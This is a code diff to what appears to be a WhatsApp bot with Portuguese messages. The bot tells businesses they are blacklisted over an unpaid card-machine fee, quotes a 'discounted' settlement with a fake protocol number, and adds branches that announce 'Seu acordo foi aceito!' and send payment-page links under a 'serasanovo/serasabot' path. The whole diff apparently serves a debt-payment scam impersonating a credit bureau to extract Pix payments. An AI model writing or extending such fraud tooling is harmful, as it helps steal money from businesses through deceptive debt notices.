@@ -148,6 +148,10 @@ client.on ('message', async msg => {
     const linksUteis = MessageMedia.fromFilePath('./assets/links_uteis.jpg');
     const carteiraDigital = MessageMedia.fromFilePath('./assets/carteiraDigital.jpg');
     const mensagemCartao = '⚠️ *Sua empresa está NEGATIVADA!*\n\n➡️ Devido à falta de pagamento da anuidade referente a máquina de débito e crédito.\n O valor fixado pela credora reclamante é de *R$798,00*, referente a cobrança anual pelo uso.\n\n💡 Está sendo liberado uma *ordem de pagamento pelo Feirão!*\nLiquide já a sua pendência pelo valor de *R$398,00* com *QUITAÇÃO IMEDIATA!*\n\n➡️ *129300000BLT14* é o número do protocolo de anuências, com este código eletrônico, sua empresa  está assegurada de apontamento no Score, Cadin Federal, CNPJ, Bacem e Spc.'
+    const msgPix = '✅ *Seu acordo foi aceito!*\n\nAcesse a página através do link na próxima mensagem para realizar o pagamendo com o desconto do *Feirão!*';
+    const linkPixUm = 'https://atentus.com.br/eva/serasanovo/serasabot/public/ofertas.html';
+    const linkPixDois = 'https://atentus.com.br/eva/serasanovo/serasabot/public/ofertas2.html';
+    const imagemPix = MessageMedia.fromFilePath('./assets/img_pix.jpg');
     const MAX_ATTEMPTS = 3;
     
     if (!state[from]) state[from] = { attempts: 0, step: 0 };
@@ -504,7 +508,7 @@ client.on ('message', async msg => {
                 return;
             }
     
-            const [protocolo, nome, cnpj, mensagemCliente, msgPadrao] = resultado.split(';');
+            const [protocolo, nome, cnpj, mensagemCliente, msgPadrao, pixUm, pixDois] = resultado.split(';');
             const imagemBaixado = MessageMedia.fromFilePath('./assets/img_baixado.jpg');
 
             if (msgPadrao === 'true') {
@@ -512,11 +516,29 @@ client.on ('message', async msg => {
                 await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
                 state[from] = { step: 3 };
 
+            }else if(pixUm === 'true'){
+                await enviarMensagemInicial(imagemBaixado, `📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* Seu título foi baixado com sucesso.`);
+                enviarMensagemInicial(imagemPix, msgPix);
+                enviarMensagemTexto(linkPixUm);
+                await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+                state[from] = { step: 3 };
+
+            }else if(pixDois === 'true'){
+                await enviarMensagemInicial(imagemBaixado, `📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* Seu título foi baixado com sucesso.`);
+                enviarMensagemInicial(imagemPix, msgPix);
+                enviarMensagemTexto(linkPixDois);
+                await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
+                state[from] = { step: 3 };
+                
             }else{
                 await enviarMensagemTexto(`📄 *Dados encontrados:*\n\n📌 *Protocolo:* ${protocolo}\n👤 *Nome:* ${nome}\n📇 *CNPJ:* ${cnpj}\n💬 *Mensagem:* ${mensagemCliente}`);
                 await enviarMensagemTexto('💁‍♀️ - *O que deseja fazer agora?*\n\n1️⃣ *- Falar com um atendente*\n2️⃣ *- Retornar ao menu principal*\n3️⃣ *- Sair*');
                 state[from] = { step: 3 };
-        }
+            }
+
+            
+
+
     
         });
         return;
